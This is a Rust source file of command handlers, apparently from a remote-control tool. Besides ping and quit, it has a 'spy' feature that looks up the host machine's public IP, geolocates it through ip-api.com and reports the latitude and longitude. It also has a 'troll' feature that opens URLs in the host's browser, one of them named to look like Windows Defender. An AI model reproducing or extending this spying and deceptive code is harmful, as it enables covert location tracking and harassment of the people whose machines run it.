use crate::core::{ Args, OutFun, Output, Text }; // TODO: Add Media if you get any issue in the media_output macro.

pub use rand::Rng;

#[cfg(feature = "troll")]
pub use open;

#[cfg(feature = "spy")]
use serde::Deserialize;
#[cfg(feature = "spy")]
use reqwest::blocking::get;

#[macro_use]
mod helpers {
    macro_rules! text_output {
        ($out:ident, $text:expr) => {
        $out(Output::Text(Text { data: $text.to_string() }))
        };
    }

    macro_rules! media_output {
        ($out:ident, $name:expr, $data:expr) => {
        $out(Output::Media(Media { name: $name, data: $data.to_string() }))
        };
    }
}

pub fn ping(_args: Args, out: OutFun) {
    text_output!(out, "Pong!");
}

pub fn quit(args: Args, out: OutFun) {
    if args.len() < 1 {
        text_output!(out, "Place 'ohyes' as an argument to quit");
    } else if args[0] != "ohyes" {
        text_output!(out, "Place 'ohyes' as an argument bro");
    } else {
        text_output!(out, "Exiting...");
        std::process::exit(0);
    }
}

#[cfg(feature = "troll")]
pub fn rickroll(_args: Args, out: OutFun) {
    let rickrolls: Vec<String> = vec![
        // We need more rickrolls
        "https://windefender.netlify.app".to_string(),
        "https://openbrowser.netlify.app".to_string()
    ];
    let rindex = rand::thread_rng().gen_range(0..rickrolls.len());
    let url = &rickrolls[rindex];
    if let Err(err) = open::that(url) {
        text_output!(out, format!("ERROR opening url: {}", err));
    }
    text_output!(out, format!("Opened url: {}", url));
}

#[cfg(feature = "spy")]
pub fn location(_args: Args, out: OutFun) {
    use crate::utils;

    text_output!(out, "Getting public IP address");

    let ip_address = match utils::get_public_ip() {
        Ok(ip) => ip,
        Err(err) => {
            text_output!(out, format!("Error getting public IP address: {}", err));
            return;
        }
    };

    let url = format!("http://ip-api.com/json/{}", ip_address);

    text_output!(out, format!("Sending request to {}", url));

    #[derive(Debug, Deserialize)]
    struct Geolocation {
        lat: f64,
        lon: f64,
    }

    let response = match get(&url) {
        Ok(response) => response,
        Err(err) => {
            text_output!(out, format!("{:?}", err));
            return;
        }
    };
    let geolocation: Geolocation = match response.json() {
        Ok(data) => data,
        Err(err) => {
            text_output!(out, format!("Error parsing JSON: {:?}", err));
            return;
        }
    };

    text_output!(
        out,
        format!(
            "Latitude: {}\nLongitude: {}\nCOORDS: {}, {}",
            geolocation.lat,
            geolocation.lon,
            geolocation.lat,
            geolocation.lon
        )
    );
}
